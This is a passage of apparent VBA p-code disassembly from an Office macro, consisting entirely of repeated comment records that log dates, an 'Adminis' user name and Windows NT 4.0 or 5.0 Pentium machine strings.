' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1466:
' Line #1467:
' Line #1468:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:22:44 PM"
' Line #1469:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1470:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1471:
' Line #1472:
' Line #1473:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:23:19 PM"
' Line #1474:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1475:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1476:
' Line #1477:
' Line #1478:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:23:47 PM"
' Line #1479:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1480:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1481:
' Line #1482:
' Line #1483:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:24:35 PM"
' Line #1484:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1485:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1486:
' Line #1487:
' Line #1488:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:25:19 PM"
' Line #1489:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1490:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1491:
' Line #1492:
' Line #1493:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:25:51 PM"
' Line #1494:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1495:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1496:
' Line #1497:
' Line #1498:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:26:42 PM"
' Line #1499:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1500:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1501:
' Line #1502:
' Line #1503:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:29:09 PM"
' Line #1504:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1505:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1506:
' Line #1507:
' Line #1508:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:30:49 PM"
' Line #1509:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1510:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1511:
' Line #1512:
' Line #1513:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:31:33 PM"
' Line #1514:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1515:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1516:
' Line #1517:
' Line #1518:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:33:46 PM"
' Line #1519:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1520:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1521:
' Line #1522:
' Line #1523:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:34:02 PM"
' Line #1524:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1525:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1526:
' Line #1527:
' Line #1528:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:34:29 PM"
' Line #1529:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1530:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1531:
' Line #1532:
' Line #1533:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:36:23 PM"
' Line #1534:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1535:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1536:
' Line #1537:
' Line #1538:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:37:03 PM"
' Line #1539:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1540:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1541:
' Line #1542:
' Line #1543:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:38:27 PM"
' Line #1544:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1545:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1546:
' Line #1547:
' Line #1548:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:46:55 PM"
' Line #1549:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1550:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1551:
' Line #1552:
' Line #1553:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:48:43 PM"
' Line #1554:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1555:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1556:
' Line #1557:
' Line #1558:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:49:45 PM"
' Line #1559:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1560:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1561:
' Line #1562:
' Line #1563:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:50:07 PM"
' Line #1564:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1565:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1566:
' Line #1567:
' Line #1568:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:54:02 PM"
' Line #1569:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1570:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1571:
' Line #1572:
' Line #1573:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:55:07 PM"
' Line #1574:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1575:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1576:
' Line #1577:
' Line #1578:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:55:27 PM"
' Line #1579:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1580:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1581:
' Line #1582:
' Line #1583:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:56:38 PM"
' Line #1584:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1585:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1586:
' Line #1587:
' Line #1588:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:57:39 PM"
' Line #1589:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1590:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1591:
' Line #1592:
' Line #1593:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:57:57 PM"
' Line #1594:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1595:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1596:
' Line #1597:
' Line #1598:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:59:40 PM"
' Line #1599:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1600:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1601:
' Line #1602:
' Line #1603:
' 	QuoteRem 0x0000 0x0013 "10/27/01 4:00:55 PM"
' Line #1604:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1605:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1606:
' Line #1607:
' Line #1608:
' 	QuoteRem 0x0000 0x0013 "10/27/01 4:03:52 PM"
' Line #1609:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1610:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1611:
' Line #1612:
' Line #1613:
' 	QuoteRem 0x0000 0x0013 "10/27/01 4:04:14 PM"
' Line #1614:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1615:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1616:
' Line #1617:
' Line #1618:
' 	QuoteRem 0x0000 0x0013 "10/27/01 4:04:43 PM"
' Line #1619:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1620:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1621:
' Line #1622:
' Line #1623:
' 	QuoteRem 0x0000 0x0013 "10/27/01 4:05:51 PM"
' Line #1624:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1625:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1626:
' Line #1627:
' Line #1628:
' 	QuoteRem 0x0000 0x0013 "10/27/01 4:07:46 PM"
' Line #1629:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1630:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1631:
' Line #1632:
' Line #1633:
' 	QuoteRem 0x0000 0x0013 "10/27/01 4:08:16 PM"
' Line #1634:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1635:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1636:
' Line #1637:
' Line #1638:
' 	QuoteRem 0x0000 0x0013 "10/27/01 4:08:31 PM"
' Line #1639:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1640:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1641:
' Line #1642:
' Line #1643:
' 	QuoteRem 0x0000 0x0013 "10/27/01 4:08:46 PM"
' Line #1644:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1645:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1646:
' Line #1647:
' Line #1648:
' 	QuoteRem 0x0000 0x0013 "10/27/01 4:09:03 PM"
' Line #1649:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1650:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1651:
' Line #1652:
' Line #1653:
' 	QuoteRem 0x0000 0x0013 "10/27/01 4:09:54 PM"
' Line #1654:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1655:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1656:
' Line #1657:
' Line #1658:
' 	QuoteRem 0x0000 0x0013 "10/27/01 4:14:26 PM"
' Line #1659:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1660:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1661:
' Line #1662:
' Line #1663:
' 	QuoteRem 0x0000 0x0014 "10/29/01 12:04:06 PM"
' Line #1664:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1665:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1666:
' Line #1667:
' Line #1668:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 17:22:50"
' Line #1669:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1670:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1671:
' Line #1672:
' Line #1673:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 17:29:30"
' Line #1674:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1675:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1676:
' Line #1677:
' Line #1678:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 20:29:39"
' Line #1679:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1680:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1681:
' Line #1682:
' Line #1683:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 20:30:19"
' Line #1684:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1685:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1686:
' Line #1687:
' Line #1688:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 20:30:36"
' Line #1689:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1690:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1691:
' Line #1692:
' Line #1693:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 20:31:20"
' Line #1694:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1695:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1696:
' Line #1697:
' Line #1698:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 20:33:00"
' Line #1699:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1700:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1701:
' Line #1702:
' Line #1703:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 20:40:34"
' Line #1704:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1705:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1706:
' Line #1707:
' Line #1708:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 20:41:59"
' Line #1709:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1710:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1711:
' Line #1712:
' Line #1713:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 20:45:46"
' Line #1714:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1715:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1716:
' Line #1717:
' Line #1718:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 20:47:42"
' Line #1719:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1720:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1721:
' Line #1722:
' Line #1723:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 20:48:20"
' Line #1724:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1725:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1726:
' Line #1727:
' Line #1728:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 20:48:20"
' Line #1729:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1730:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1731:
' Line #1732:
' Line #1733:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 20:54:06"
' Line #1734:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1735:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1736:
' Line #1737:
' Line #1738:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 20:54:50"
' Line #1739:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1740:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1741:
' Line #1742:
' Line #1743:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 20:59:27"
' Line #1744:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1745:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1746:
' Line #1747:
' Line #1748:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 20:59:28"
' Line #1749:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1750:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1751:
' Line #1752:
' Line #1753:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 21:01:25"
' Line #1754:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1755:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1756:
' Line #1757:
' Line #1758:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 21:02:25"
' Line #1759:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1760:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1761:
' Line #1762:
' Line #1763:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 21:04:22"
' Line #1764:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1765:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1766:
' Line #1767:
' Line #1768:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 21:04:23"
' Line #1769:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1770:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1771:
' Line #1772:
' Line #1773:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 21:11:54"
' Line #1774:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1775:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1776:
' Line #1777:
' Line #1778:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 21:13:21"
' Line #1779:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1780:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1781:
' Line #1782:
' Line #1783:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 21:15:11"
' Line #1784:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1785:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1786:
' Line #1787:
' Line #1788:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 21:16:19"
' Line #1789:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1790:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1791:
' Line #1792:
' Line #1793:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 21:17:26"
' Line #1794:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1795:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1796:
' Line #1797:
' Line #1798:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 21:19:24"
' Line #1799:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1800:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1801:
' Line #1802:
' Line #1803:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 21:19:56"
' Line #1804:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1805:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1806:
' Line #1807:
' Line #1808:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 21:20:32"
' Line #1809:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1810:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1811:
' Line #1812:
' Line #1813:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 21:20:32"
' Line #1814:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1815:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1816:
' Line #1817:
' Line #1818:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 21:22:51"
' Line #1819:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1820:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1821:
' Line #1822:
' Line #1823:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 21:24:22"
' Line #1824:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1825:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1826:
' Line #1827:
' Line #1828:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 21:25:16"
' Line #1829:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1830:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1831:
' Line #1832:
' Line #1833:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 21:25:53"
' Line #1834:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1835:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1836:
' Line #1837:
' Line #1838:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 21:25:53"
' Line #1839:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1840:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1841:
' Line #1842:
' Line #1843:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 21:28:42"
' Line #1844:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1845:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1846:
' Line #1847:
' Line #1848:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 21:30:14"
' Line #1849:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1850:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1851:
' Line #1852:
' Line #1853:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 21:31:11"
' Line #1854:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1855:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1856:
' Line #1857:
' Line #1858:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 21:32:51"
' Line #1859:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1860:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1861:
' Line #1862:
' Line #1863:
' 	QuoteRem 0x0000 0x0013 "12.11.2000 21:33:17"
' Line #1864:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1865:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1866:
' Line #1867:
' Line #1868:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 11:54:56"
' Line #1869:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1870:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1871:
' Line #1872:
' Line #1873:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 11:57:58"
' Line #1874:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1875:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1876:
' Line #1877:
' Line #1878:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 11:58:49"
' Line #1879:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1880:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1881:
' Line #1882:
' Line #1883:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 12:00:43"
' Line #1884:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1885:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1886:
' Line #1887:
' Line #1888:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 12:01:09"
' Line #1889:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1890:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1891:
' Line #1892:
' Line #1893:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 12:01:25"
' Line #1894:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1895:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1896:
' Line #1897:
' Line #1898:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 12:01:49"
' Line #1899:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1900:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1901:
' Line #1902:
' Line #1903:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 12:01:58"
' Line #1904:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1905:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1906:
' Line #1907:
' Line #1908:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 13:17:12"
' Line #1909:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1910:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1911:
' Line #1912:
' Line #1913:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 13:21:24"
' Line #1914:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1915:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1916:
' Line #1917:
' Line #1918:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 13:22:18"
' Line #1919:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1920:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1921:
' Line #1922:
' Line #1923:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 13:35:30"
' Line #1924:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1925:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1926:
' Line #1927:
' Line #1928:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 13:36:18"
' Line #1929:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1930:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1931:
' Line #1932:
' Line #1933:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:21:35"
' Line #1934:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1935:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1936:
' Line #1937:
' Line #1938:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:23:02"
' Line #1939:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1940:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1941:
' Line #1942:
' Line #1943:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:23:11"
' Line #1944:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1945:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1946:
' Line #1947:
' Line #1948:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:23:21"
' Line #1949:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1950:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1951:
' Line #1952:
' Line #1953:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:23:29"
' Line #1954:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1955:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1956:
' Line #1957:
' Line #1958:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:23:36"
' Line #1959:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1960:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1961:
' Line #1962:
' Line #1963:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:23:46"
' Line #1964:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1965:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1966:
' Line #1967:
' Line #1968:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:23:57"
' Line #1969:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1970:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1971:
' Line #1972:
' Line #1973:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:24:04"
' Line #1974:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1975:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1976:
' Line #1977:
' Line #1978:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:24:17"
' Line #1979:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1980:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1981:
' Line #1982:
' Line #1983:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:26:45"
' Line #1984:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1985:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1986:
' Line #1987:
' Line #1988:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:29:04"
' Line #1989:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1990:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1991:
' Line #1992:
' Line #1993:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:30:43"
' Line #1994:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #1995:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #1996:
' Line #1997:
' Line #1998:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:33:28"
' Line #1999:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2000:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2001:
' Line #2002:
' Line #2003:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:33:41"
' Line #2004:
